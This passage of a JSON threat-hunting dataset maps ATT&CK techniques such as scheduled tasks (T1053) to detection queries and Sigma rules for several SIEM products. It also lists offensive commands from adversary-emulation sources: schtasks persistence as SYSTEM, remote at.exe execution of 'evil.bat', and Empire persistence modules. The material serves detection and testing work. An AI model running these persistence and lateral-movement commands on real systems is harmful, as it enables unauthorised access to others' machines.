@- localhost:9200/_watcher/watch/Net.exe-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Net.exe Execution\",\\n    \"description\": \"Detects execution of Net.exe, whether suspicious or benign.\",\\n    \"tags\": [\\n      \"attack.s0039\",\\n      \"attack.t1027\",\\n      \"attack.t1049\",\\n      \"attack.t1077\",\\n      \"attack.t1135\",\\n      \"attack.lateral_movement\",\\n      \"attack.discovery\",\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:(*\\\\\\\\ group* OR *\\\\\\\\ localgroup* OR *\\\\\\\\ user* OR *\\\\\\\\ view* OR *\\\\\\\\ share OR *\\\\\\\\ accounts* OR *\\\\\\\\ use* OR *\\\\\\\\ stop\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:(*\\\\\\\\ group* OR *\\\\\\\\ localgroup* OR *\\\\\\\\ user* OR *\\\\\\\\ view* OR *\\\\\\\\ share OR *\\\\\\\\ accounts* OR *\\\\\\\\ use* OR *\\\\\\\\ stop\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Net.exe Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\net.exe *\\\\\\\\net1.exe) AND CommandLine.keyword:(* group* * localgroup* * user* * view* * share * accounts* * use* * stop *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\") (CommandLine=\"* group*\" OR CommandLine=\"* localgroup*\" OR CommandLine=\"* user*\" OR CommandLine=\"* view*\" OR CommandLine=\"* share\" OR CommandLine=\"* accounts*\" OR CommandLine=\"* use*\" OR CommandLine=\"* stop *\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"] CommandLine IN [\"* group*\", \"* localgroup*\", \"* user*\", \"* view*\", \"* share\", \"* accounts*\", \"* use*\", \"* stop *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))(?=.*(?:.*.* group.*|.*.* localgroup.*|.*.* user.*|.*.* view.*|.*.* share|.*.* accounts.*|.*.* use.*|.*.* stop .*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: windows network share discovery (windows server 2016) Detection\ndescription: windows server 2016, windows server 2012, domain environment\ntags: T1135\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net view \\\\ * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # adjusted user rights. Note This event enabled more than 2016 windows server system\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5158 #Windows screening platform has been allowed to bind the local port. Note that the source port, protocol\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5156 #Windows screening platform has been allowed to connect.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Direction: Outbound network information #> Direction: Outbound\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # IP address of the host to initiate inquiry\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # 5158 and the same event source port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetaddress: * # destination IP address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetport: 445 # destination port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Agreement: * # protocol, the same protocol and 5158\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows network share discovery (windows server 2012) Detection\ndescription: windows server 2016, windows server 2012, domain environment\ntags: T1135\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5156 #Windows screening platform has been allowed to connect.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Direction: Inbound network information #> Direction: Inbound\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # queried host IP address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: 445\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetaddress: * # Destination Address IP address of the host to initiate queries\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Targetport: * # target host port IP port to initiate queries\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Agreement: * # protocol, the 5156 and 2016 events, 5158 incident involving a consensual agreement\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4702 # assigned special permissions for the new login.\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4624 # account was successfully logged.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0logontype: 3 # 3 type landing\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourcenetworkaddress: * # Network Information> source network address above 5156 target address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # Network Information> source network port above 5156 target port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Loginprocess: Kerberos # detailed authentication information> login process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Authenticationpackage: Kerberos # Detailed Authentication Information> Authentication Package\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5140 # visited network shared objects.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: file # Network Information> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # Network Information> source address above 5156 target address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # Network Information> source port destination port above 5156\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sharename: \\\\ * \\ IPC $ # Share Information> Share name\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5140 # visited network shared objects.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: file # Network Information> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # Network Information> source address above 5156 target address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # Network Information> source port destination port above 5156\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sharename: \\\\ * \\ IPC $ # Share Information> Share name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Relativetargetname: srvsvc # Share Information> relative to the target name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 10s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "schtasks [/s HOSTNAME]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell schtasks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a scheduled task:\nschtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nnet start schedule\nsc config schedule start= auto", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a scheduled task:\nshell schtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nshell net start schedule\nshell sc config schedule start= auto", "name": "Cobalt Strike"}, {"source": "atomics/T1053/T1053.yaml", "command": "at 13:20 /interactive cmd\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S #{target} /RU DOMAIN\\user /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "name": null}, {"source": "Threat Hunting Tables", "command": "schtask.exe /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "name": null}, {"source": "Threat Hunting Tables", "command": "schtask.exe /create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"", "name": null}, {"source": "Threat Hunting Tables", "command": "at.exe ##:## /interactive cmd", "name": null}, {"source": "Threat Hunting Tables", "command": "at.exe \\\\[computername|IP] ##:## c:\\temp\\evil.bat", "name": null}, {"source": "Threat Hunting Tables", "command": "net.exe use \\\\[computername|IP] /user:DOMAIN\\username password", "name": null}, {"source": "Threat Hunting Tables", "command": "net.exe time \\\\[computername|IP]", "name": null}, {"source": "Threat Hunting Tables", "command": "schtasks.exe /create * appdata", "name": null}, {"source": "SysmonHunter - Scheduled Task", "command": "\\\\Windows\\\\.+\\\\at.exe", "name": null}, {"source": "SysmonHunter - Scheduled Task", "command": "/Create\\\\Windows\\\\.+\\\\schtasks.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/new_gpo_immediate_task", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/new_gpo_immediate_task", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/schtasks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/schtasks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/schtasks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/schtasks", "name": "Empire Module Command"}], "command_list": ["schtasks [/s HOSTNAME]", "shell schtasks", "Creating a scheduled task:\nschtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nnet start schedule\nsc config schedule start= auto", "Creating a scheduled task:\nshell schtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nshell net start schedule\nshell sc config schedule start= auto", "at 13:20 /interactive cmd\n", "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST #{time}\n", "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST #{time}\n", "SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST #{time}\n", "SCHTASKS /Create /S #{target} /RU DOMAIN\\user /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "schtask.exe /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "schtask.exe /create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"", "at.exe ##:## /interactive cmd", "at.exe \\\\[computername|IP] ##:## c:\\temp\\evil.bat", "net.exe use \\\\[computername|IP] /user:DOMAIN\\username password", "net.exe time \\\\[computername|IP]", "schtasks.exe /create * appdata", "\\\\Windows\\\\.+\\\\at.exe", "/Create\\\\Windows\\\\.+\\\\schtasks.exe", "powershell/lateral_movement/new_gpo_immediate_task", "powershell/lateral_movement/new_gpo_immediate_task", "powershell/persistence/elevated/schtasks", "powershell/persistence/elevated/schtasks", "powershell/persistence/userland/schtasks", "powershell/persistence/userland/schtasks"], "technique_id": "T1053", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1053", "Built-in Windows Command": "schtasks [/s HOSTNAME]", "Cobalt Strike": "shell schtasks", "Description": "Displays all of the currently scheduled tasks to be run on a computer", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1053", "Built-in Windows Command": "Creating a scheduled task:\nschtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nnet start schedule\nsc config schedule start= auto", "Cobalt Strike": "Creating a scheduled task:\nshell schtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nshell net start schedule\nshell sc config schedule start= auto", "Description": "Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)\nmay need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.\nDelete a scheduled task by name:\nschtasks [/s HOSTNAME] /delete /tn \"name\"", "Metasploit": ""}}, {"Atomic Red Team Test - Scheduled Task": {"display_name": "Scheduled Task", "atomic_tests": [{"description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n", "supported_platforms": ["windows"], "name": "At.exe Scheduled task", "executor": {"elevation_required": false, "command": "at 13:20 /interactive cmd\n", "name": "command_prompt"}}, {"description": "", "supported_platforms": ["windows"], "name": "Scheduled task Local", "input_arguments": {"task_command": {"default": "C:\\windows\\system32\\cmd.exe", "type": "String", "description": "What you want to execute"}, "time": {"default": 1210, "type": "String", "description": "What time 24 Hour"}}, "executor": {"elevation_required": true, "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n", "name": "command_prompt", "cleanup_command": "SCHTASKS /Delete /TN spawn /F\n"}}, {"description": "Create a task on a remote system\n", "supported_platforms": ["windows"], "name": "Scheduled task Remote", "input_arguments": {"task_command": {"default": "C:\\windows\\system32\\cmd.exe", "type": "String", "description": "What you want to execute"}, "password": {"default": "At0micStrong", "type": "String", "description": "Password"}, "user_name": {"default": "DOMAIN\\user", "type": "String", "description": "Username DOMAIN\\User"}, "target": {"default": "localhost", "type": "String", "description": "Target"}, "time": {"default": 1210, "type": "String", "description": "What time 24 Hour"}}, "executor": {"elevation_required": true, "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "name": "command_prompt", "cleanup_command": "SCHTASKS /Delete /TN \"Atomic task\" /F\n"}}, {"description": "Create an atomic scheduled task that leverages native powershell cmdlets.\nThese could be considered \"fileless\" scheduled task creation.\n", "supported_platforms": ["windows"], "name": "Powershell Cmdlet Scheduled Task", "executor": {"elevation_required": false, "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "name": "powershell", "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1\n"}}], "attack_technique": "T1053"}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "schtask.exe", "itw_sample": "", "chain_id": "100184", "registry_value": "", "mitre_caption": "scheduled_task", "registry_path": "", "frequency": "high", "commandline_string": "/Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "schtask.exe", "itw_sample": "", "chain_id": "100185", "registry_value": "", "mitre_caption": "scheduled_task", "registry_path": "", "frequency": "high", "commandline_string": "/create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "at.exe", "itw_sample": "", "chain_id": "100186", "registry_value": "", "mitre_caption": "scheduled_task", "registry_path": "", "frequency": "high", "commandline_string": "##:## /interactive cmd", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "at.exe", "itw_sample": "", "chain_id": "100187", "registry_value": "", "mitre_caption": "scheduled_task", "registry_path": "", "frequency": "high", "commandline_string": "\\\\[computername|IP] ##:## c:\\temp\\evil.bat", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "net.exe", "itw_sample": "", "chain_id": "100188", "registry_value": "", "mitre_caption": "scheduled_task", "registry_path": "", "frequency": "high", "commandline_string": "use \\\\[computername|IP] /user:DOMAIN\\username password", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "net.exe", "itw_sample": "", "chain_id": "100189", "registry_value": "", "mitre_caption": "scheduled_task", "registry_path": "", "frequency": "low", "commandline_string": "time \\\\[computername|IP]", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1053", "file_value": "", "file_path": "", "parent_process": "schtasks.exe", "itw_sample": "fe66f4fec21229bd008d7974f071fae1a1a2ef7a1365cee27675f197719a8e27", "chain_id": "100206", "registry_value": "", "mitre_caption": "", "registry_path": "", "frequency": "low", "commandline_string": "/create * appdata", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1053": {"phase": "Execution", "query": [{"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\at.exe", "flag": "regex"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "/Create"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\schtasks.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Scheduled Task", "level": "high"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1053", "Empire Module": "powershell/lateral_movement/new_gpo_immediate_task", "Technique": "Scheduled Task", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/new_gpo_immediate_task\":  [\"T1053\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1053", "Empire Module": "powershell/persistence/elevated/schtasks", "Technique": "Scheduled Task", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/schtasks\":  [\"T1053\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1053", "Empire Module": "powershell/persistence/userland/schtasks", "Technique": "Scheduled Task", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/userland/schtasks\":  [\"T1053\"],"}}], "queries": [{"query": "Sysmon| where EventID == 11 and process_command_line contains \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\"or file_name contains \"C:\\\\Windows\\\\System32\\\\Tasks\\\\\"or file_name contains \"C:\\\\Windows\\\\Tasks\\\\\"", "product": "Azure Sentinel", "name": "Scheduled Task FileAccess"}, {"query": "Sysmon| where EventID == 1 and (process_path contains \"taskeng.exe\"or process_path contains \"schtasks.exe\"or (process_path contains \"svchost.exe\"and process_parent_command_line != \"C:\\\\Windows\\\\System32\\\\services.exe\"))", "product": "Azure Sentinel", "name": "Scheduled Task Process"}, {"query": "title: Windows 10 scheduled task SandboxEscaper 0-day \nstatus: experimental\ndescription: Detects Task Scheduler .job import arbitrary DACL write\\par\nreferences:\n   - https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe\nauthor: Olaf Hartong\ndate: 2019/05/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n   selection:\n       Image: 'schtasks.exe'\n       CommandLine: '*/change*/TN*/RU*/RP*'\n   condition: selection\nfalsepositives:\n   - Unknown\ntags:\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1053\n    - car.2013-08-001\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows 10 scheduled task SandboxEscaper 0-day \nstatus: experimental\ndescription: Detects Task Scheduler .job import arbitrary DACL write\\par\nreferences:\n   - https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe\nauthor: Olaf Hartong\ndate: 2019/05/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n   selection:\n       Image: 'schtasks.exe'\n       CommandLine: '*/change*/TN*/RU*/RP*'\n   condition: selection\nfalsepositives:\n   - Unknown\ntags:\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1053\n    - car.2013-08-001\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image:\"schtasks.exe\" AND CommandLine.keyword:*\\\\/change*\\\\/TN*\\\\/RU*\\\\/RP*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-10-scheduled-task-SandboxEscaper-0-day <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows 10 scheduled task SandboxEscaper 0-day\",\\n    \"description\": \"Detects Task Scheduler .job import arbitrary DACL write\\\\\\\\par\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.execution\",\\n      \"attack.t1053\",\\n      \"car.2013-08-001\"\\n    ],\\n    \"query\": \"(Image:\\\\\"schtasks.exe\\\\\" AND CommandLine.keyword:*\\\\\\\\/change*\\\\\\\\/TN*\\\\\\\\/RU*\\\\\\\\/RP*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image:\\\\\"schtasks.exe\\\\\" AND CommandLine.keyword:*\\\\\\\\/change*\\\\\\\\/TN*\\\\\\\\/RU*\\\\\\\\/RP*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows 10 scheduled task SandboxEscaper 0-day\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image:\"schtasks.exe\" AND 